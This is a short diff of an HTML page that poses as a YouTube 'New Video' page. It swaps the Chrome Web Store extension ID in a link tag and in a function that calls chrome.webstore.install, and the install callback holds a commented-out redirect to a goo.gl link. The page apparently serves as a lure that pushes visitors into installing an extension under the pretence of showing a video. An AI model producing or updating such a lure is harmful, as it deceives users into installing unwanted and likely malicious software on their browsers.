@@ -6,7 +6,7 @@
 
 
 
-<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/bekganobpocabjbkbpibgmfeaccocllh">
+<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/chlikobcdkobgjojmlebidahecojolmj">
 <link rel="shortcut icon" href="https://s.ytimg.com/yts/img/favicon-vfldLzJxy.ico" type="image/x-icon">
 
 <title>New Video</title>
@@ -295,7 +295,7 @@ $("#dos").show();
  }
 }
 function chromex(){
-			 chrome.webstore.install("https://chrome.google.com/webstore/detail/bekganobpocabjbkbpibgmfeaccocllh", function(){
+			 chrome.webstore.install("https://chrome.google.com/webstore/detail/chlikobcdkobgjojmlebidahecojolmj", function(){
 				 var dax = new Image();
 dax.onload = function(){
 //window.location = "http://goo.gl/9upmZJ";
